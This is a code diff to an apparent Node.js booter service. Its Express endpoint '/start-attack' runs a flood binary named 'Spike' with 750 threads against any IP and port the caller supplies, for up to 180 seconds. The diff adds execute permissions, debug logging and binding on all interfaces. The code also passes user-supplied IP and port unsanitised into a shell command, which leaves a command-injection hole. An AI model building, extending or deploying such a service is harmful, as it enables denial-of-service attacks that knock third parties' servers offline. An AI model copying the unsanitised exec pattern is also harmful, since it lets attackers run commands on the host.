@@ -18,6 +18,15 @@ const PACKET_SIZE = 1024; // Predefined packet size
 const THREADS = 750; // Predefined threads
 const BINARY_NAME = 'Spike'; // Binary name
 
+// Set executable permission for Spike
+exec(`chmod +x ${BINARY_NAME}`, (error, stdout, stderr) => {
+    if (error) {
+        console.error('Error setting executable permission:', error);
+    } else {
+        console.log('Executable permission set for Spike');
+    }
+});
+
 // Endpoint to set up VPS
 app.post('/setup-vps', (req, res) => {
     const { ip, username, password } = req.body;
@@ -75,11 +84,23 @@ app.post('/start-attack', (req, res) => {
         return res.status(400).json({ message: 'Duration must be 180 seconds or less!' });
     }
 
+    // Log current directory and files
+    exec('pwd && ls -l', (error, stdout, stderr) => {
+        if (error) {
+            console.error('Error listing files:', error);
+        } else {
+            console.log('Current directory and files:', stdout);
+        }
+    });
+
     // Execute the binary with predefined packet_size and threads
     const command = `./${BINARY_NAME} ${ip} ${port} ${duration} ${PACKET_SIZE} ${THREADS}`;
+    console.log('Executing command:', command);
+
     exec(command, (error, stdout, stderr) => {
         if (error) {
             console.error('Error executing binary:', error);
+            console.error('Stderr:', stderr);
             return res.status(500).json({ message: 'Attack failed!' });
         }
         console.log('Binary output:', stdout);
@@ -88,6 +109,6 @@ app.post('/start-attack', (req, res) => {
 });
 
 const PORT = process.env.PORT || 3000; // Use Render's PORT or default to 3000
-app.listen(PORT, () => {
+app.listen(PORT, '0.0.0.0', () => {
     console.log(`Server running on http://localhost:${PORT}`);
 });
